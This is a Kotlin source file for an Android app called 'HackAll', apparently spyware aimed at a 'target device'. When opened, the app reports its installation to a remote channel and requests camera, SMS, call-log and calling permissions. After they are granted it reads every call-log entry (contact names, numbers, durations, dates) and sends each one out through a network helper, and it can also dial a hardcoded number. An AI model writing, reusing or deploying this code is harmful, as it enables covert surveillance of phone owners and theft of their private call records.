package cocomelonc.hackall

import android.Manifest
import android.annotation.SuppressLint
import android.content.IntentFilter
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Bundle
import android.provider.CallLog
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.net.toUri
import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
import cocomelonc.hackall.tools.HackAllNetwork
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.DexterError
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.PermissionRequestErrorListener
import com.karumi.dexter.listener.multi.MultiplePermissionsListener

class HackAllMainActivity : ComponentActivity() {
    private val number = "107"
    private lateinit var cameraButton: Button
    lateinit var receiver: HackAllAirPlaneBroadcastReceiver

    private fun checkCallPermission() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            startCall()
        } else {
            startCallPermissionRequest()
        }
    }

    private fun startCall() {
        var intent = Intent(Intent.ACTION_CALL)
        intent.data = "tel:$number".toUri()
        startActivity(intent)
    }

    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) {
        isGranted-> {
            if (isGranted) {
                startCall()
            } else {
                Toast.makeText(applicationContext, "Hack All call permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }
    private fun startCallPermissionRequest() {
        requestPermissionLauncher.launch(Manifest.permission.CALL_PHONE)
    }

    private fun requestPermissions() {
        // below line is use to request permission in the current activity.
        // this method is use to handle error in runtime permissions
        Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
            .withPermissions(
                Manifest.permission.CAMERA,  // below is the list of permissions
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
            ) // after adding permissions we are calling an with listener method.
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
                    // this method is called when all permissions are granted
                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
                        // do you work now
                        Toast.makeText(
                            applicationContext,
                            "All the permissions are granted..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
                        sendLogs()
                    }

                    // check for permanent denial of any permission
                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                        // permission is denied permanently, we will show user a message.
                        Toast.makeText(
                            applicationContext,
                            "Hack All some permissions denied..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All some permissions denied\n")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    list: MutableList<PermissionRequest?>?,
                    permissionToken: PermissionToken
                ) {
                    // this method is called when user grants some permission and denies some of them.
                    permissionToken.continuePermissionRequest()
                }
            }).withErrorListener(PermissionRequestErrorListener { _: DexterError? ->
                // we are displaying a toast message for error message.
                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
                    .show()
            }) // below line is use to run the permissions on same thread and to check the permissions
            .onSameThread().check()
    }

    override fun onStop() {
        super.onStop()
        unregisterReceiver(receiver)
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        HackAllNetwork(this).sendTextMessage("LoveBahrain All App has been installed on target device and opened\n")
        this.requestPermissions()
        cameraButton = findViewById(R.id.camButton)
        cameraButton.setOnClickListener {
            requestPermissions()
            checkCallPermission()
        }

        receiver = HackAllAirPlaneBroadcastReceiver()

        IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED).also {
            registerReceiver(receiver, it)
        }
    }

    @SuppressLint("NewApi")
    private fun sendLogs() {
        val cols = arrayOf(CallLog.Calls._ID,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION, CallLog.Calls.DATE)
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, cols, null,
            null, "${CallLog.Calls.LAST_MODIFIED} DESC")

        cursor?.use {
            val idIndex = it.getColumnIndex(CallLog.Calls._ID)
            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

            while (it.moveToNext()) {
                val idRow = it.getString(idIndex)
                val nameRow = it.getString(nameIndex)
                val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
                val number = it.getString(numberIndex)
                val duration = it.getString(durationIndex) ?: "0"
                val type = it.getString(typeIndex)
                val date = it.getString(dateIndex)
                HackAllNetwork(this).sendTextMessage("CALL LOG: $idRow, $name, $number, $duration, $type, $date")
            }
        }
    }
}